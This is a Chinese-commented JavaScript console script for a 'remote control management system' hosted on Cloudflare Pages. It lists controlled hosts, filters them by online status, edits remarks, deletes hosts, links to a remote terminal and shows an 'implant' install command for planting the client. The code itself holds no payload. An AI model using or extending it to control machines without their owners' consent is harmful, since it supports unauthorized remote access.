/**
 * 远控管理系统 - 控制台脚本（CF Pages 版）
 * 负责：认证检查、主机列表加载、搜索筛选、备注编辑、主机删除与自动刷新。
 *
 * 与原 PHP 版的差异：
 * - API 端点改为 /api/admin
 * - 终端链接改为 terminal.html
 * - 页面加载时先获取认证状态（CSRF 令牌 + 用户名）
 */
(function () {
    'use strict';

    // API 端点
    const API = '/api/admin';
    // 全部主机数据
    let allAgents = [];
    // 当前筛选状态：all / online / offline
    let currentFilter = 'all';
    // 自动刷新定时器句柄
    let autoTimer = null;

    /* ---------- 内部工具：判断主机是否在线 ---------- */
    function isOnline(agent) {
        if (!agent) return false;
        const s = agent.status;
        if (typeof s === 'number') return s === 1;
        if (typeof s === 'string') return s === '1' || s.toLowerCase() === 'online';
        return false;
    }

    /* ---------- 内部工具：转义为 JS 字符串字面量内容 ---------- */
    function jsStr(s) {
        if (s === null || s === undefined) s = '';
        return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, "\\'")
            .replace(/"/g, '\\"')
            .replace(/\r/g, '\\r')
            .replace(/\n/g, '\\n')
            .replace(/\u2028/g, '\\u2028')
            .replace(/\u2029/g, '\\u2029');
    }

    function attrStr(s) {
        return App.escHtml(jsStr(s));
    }

    /* ---------- 加载主机列表 ---------- */
    async function loadAgents() {
        try {
            const data = await App.apiGet(API, { action: 'get_agents' });
            allAgents = (data && Array.isArray(data.agents)) ? data.agents : [];
        } catch (err) {
            console.error('加载主机列表失败:', err);
        }
        updateStats();
        renderTable();
    }

    /* ---------- 更新统计卡片 ---------- */
    function updateStats() {
        const total = allAgents.length;
        let online = 0;
        allAgents.forEach(function (a) { if (isOnline(a)) online++; });
        const offline = total - online;

        setText('statTotal', total);
        setText('statOnline', online);
        setText('statOffline', offline);
    }

    function setText(id, val) {
        const el = document.getElementById(id);
        if (el) el.textContent = val;
    }

    /* ---------- 渲染表格 ---------- */
    function renderTable() {
        const tbody = document.getElementById('agentList');
        if (!tbody) return;

        const keyword = (document.getElementById('searchInput').value || '').trim().toLowerCase();

        const list = allAgents.filter(function (agent) {
            if (currentFilter === 'online' && !isOnline(agent)) return false;
            if (currentFilter === 'offline' && isOnline(agent)) return false;
            if (keyword) {
                const hay = [
                    agent.hostname || '',
                    agent.ip_address || '',
                    agent.remark || '',
                    agent.agent_id || ''
                ].join(' ').toLowerCase();
                if (hay.indexOf(keyword) === -1) return false;
            }
            return true;
        });

        if (list.length === 0) {
            tbody.innerHTML =
                '<tr><td colspan="7">' +
                '<div class="empty-state">' +
                '<i class="bi bi-inbox"></i>' +
                '<p>暂无主机</p>' +
                '<p class="sub">请使用上方命令植入客户端</p>' +
                '</div></td></tr>';
            return;
        }

        tbody.innerHTML = list.map(function (agent) {
            const online = isOnline(agent);
            const statusCls = online ? 'online' : 'offline';
            const statusText = online ? '在线' : '离线';

            const hostname = agent.hostname || '未命名主机';
            const ip = agent.ip_address || '-';
            const id = agent.agent_id || '';
            const remark = agent.remark || '';
            const lastSeen = agent.last_seen || '';

            const shortId = id.length > 12 ? id.slice(0, 12) + '…' : id;

            const remarkCell = remark
                ? App.escHtml(remark)
                : '<span class="text-muted">无</span>';

            const agoText = App.timeAgo(lastSeen);
            const fullTime = App.formatTime(lastSeen);

            // 终端链接改为 terminal.html
            const termHref = 'terminal.html?agent_id=' + encodeURIComponent(id) +
                '&hostname=' + encodeURIComponent(hostname);

            return (
                '<tr class="' + (online ? 'agent-online' : 'agent-offline') + '">' +
                '<td><span class="status-pill ' + statusCls + '">' +
                '<span class="status-dot ' + statusCls + '"></span>' + statusText +
                '</span></td>' +
                '<td><span class="host-name"><i class="bi bi-pc-display"></i>' +
                App.escHtml(hostname) + '</span></td>' +
                '<td><code class="ip-code">' + App.escHtml(ip) + '</code></td>' +
                '<td><span class="agent-id-badge" title="' + App.escHtml(id) + '" ' +
                'onclick="copyAgentId(\'' + attrStr(id) + '\')">' +
                App.escHtml(shortId) + '</span></td>' +
                '<td>' + remarkCell + '</td>' +
                '<td><small class="text-muted" title="' + App.escHtml(fullTime) + '">' +
                App.escHtml(agoText) + '</small></td>' +
                '<td><div class="row-actions">' +
                '<a class="btn-terminal" href="' + termHref + '"><i class="bi bi-terminal"></i> 终端</a>' +
                '<button class="btn-icon edit" title="编辑备注" ' +
                'onclick="editRemark(\'' + attrStr(id) + '\',\'' + attrStr(remark) + '\')">' +
                '<i class="bi bi-pencil"></i></button>' +
                '<button class="btn-icon danger" title="删除主机" ' +
                'onclick="deleteAgent(\'' + attrStr(id) + '\')">' +
                '<i class="bi bi-trash"></i></button>' +
                '</div></td>' +
                '</tr>'
            );
        }).join('');
    }

    /* ============ 供 onclick 调用的函数 ============ */

    function copyInstallCmd() {
        const el = document.getElementById('installCmd');
        App.copyToClipboard(el ? el.textContent : '');
    }

    function copyAgentId(id) {
        App.copyToClipboard(id);
    }

    function editRemark(id, remark) {
        document.getElementById('remarkAgentId').value = id;
        document.getElementById('remarkInput').value = remark || '';
        bootstrap.Modal.getOrCreateInstance(
            document.getElementById('remarkModal')
        ).show();
    }

    async function saveRemark() {
        const agentId = document.getElementById('remarkAgentId').value;
        const remark = document.getElementById('remarkInput').value;
        try {
            const data = await App.apiPost(API, {
                action: 'update_remark',
                agent_id: agentId,
                remark: remark
            });
            if (data && data.success) {
                bootstrap.Modal.getInstance(
                    document.getElementById('remarkModal')
                ).hide();
                App.showToast('备注已更新');
                loadAgents();
            } else {
                App.showToast((data && data.error) ? data.error : '保存失败', 'error');
            }
        } catch (err) {
            App.showToast('保存失败', 'error');
        }
    }

    function deleteAgent(id) {
        document.getElementById('deleteAgentId').value = id;
        bootstrap.Modal.getOrCreateInstance(
            document.getElementById('deleteModal')
        ).show();
    }

    async function confirmDelete() {
        const agentId = document.getElementById('deleteAgentId').value;
        try {
            const data = await App.apiPost(API, {
                action: 'delete_agent',
                agent_id: agentId
            });
            if (data && data.success) {
                bootstrap.Modal.getInstance(
                    document.getElementById('deleteModal')
                ).hide();
                App.showToast('已删除');
                loadAgents();
            } else {
                App.showToast((data && data.error) ? data.error : '删除失败', 'error');
            }
        } catch (err) {
            App.showToast('删除失败', 'error');
        }
    }

    window.copyInstallCmd = copyInstallCmd;
    window.copyAgentId = copyAgentId;
    window.editRemark = editRemark;
    window.saveRemark = saveRemark;
    window.deleteAgent = deleteAgent;
    window.confirmDelete = confirmDelete;

    /* ============ 事件绑定 ============ */
    function bindEvents() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.addEventListener('input', App.debounce(renderTable, 200));
        }

        const chips = [
            { id: 'filterAll', value: 'all' },
            { id: 'filterOnline', value: 'online' },
            { id: 'filterOffline', value: 'offline' }
        ];
        chips.forEach(function (c) {
            const btn = document.getElementById(c.id);
            if (!btn) return;
            btn.addEventListener('click', function () {
                chips.forEach(function (o) {
                    const el = document.getElementById(o.id);
                    if (el) el.classList.remove('active');
                });
                btn.classList.add('active');
                currentFilter = c.value;
                renderTable();
            });
        });

        const refreshBtn = document.getElementById('refreshBtn');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', loadAgents);
        }
    }

    /* ============ 自动刷新 ============ */
    function startAutoRefresh() {
        stopAutoRefresh();
        autoTimer = setInterval(loadAgents, 10000);
    }

    function stopAutoRefresh() {
        if (autoTimer) {
            clearInterval(autoTimer);
            autoTimer = null;
        }
    }

    function bindVisibility() {
        document.addEventListener('visibilitychange', function () {
            if (document.hidden) {
                stopAutoRefresh();
            } else {
                loadAgents();
                startAutoRefresh();
            }
        });
    }

    /* ============ 加载植入命令 ============ */
    async function loadInstallCmd() {
        try {
            const data = await App.apiGet(API, { action: 'get_install_cmd' });
            if (data && data.install_cmd) {
                const el = document.getElementById('installCmd');
                if (el) el.textContent = data.install_cmd;
            }
        } catch (err) {
            console.error('加载植入命令失败:', err);
        }
    }

    /* ============ 初始化 ============ */
    async function init() {
        // 先获取认证状态（CSRF 令牌 + 用户名）
        const auth = await App.fetchAuth();
        if (!auth.authenticated) {
            window.location.href = '/';
            return;
        }

        // 设置用户名显示
        const userEl = document.getElementById('navUsername');
        if (userEl) userEl.textContent = auth.username || 'admin';

        // 设置 CSRF 令牌到 meta 标签（供 apiPost 读取）
        let meta = document.querySelector('meta[name="csrf-token"]');
        if (!meta) {
            meta = document.createElement('meta');
            meta.name = 'csrf-token';
            document.head.appendChild(meta);
        }
        meta.setAttribute('content', auth.csrf_token || '');

        bindEvents();
        bindVisibility();
        loadInstallCmd();
        loadAgents();
        startAutoRefresh();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
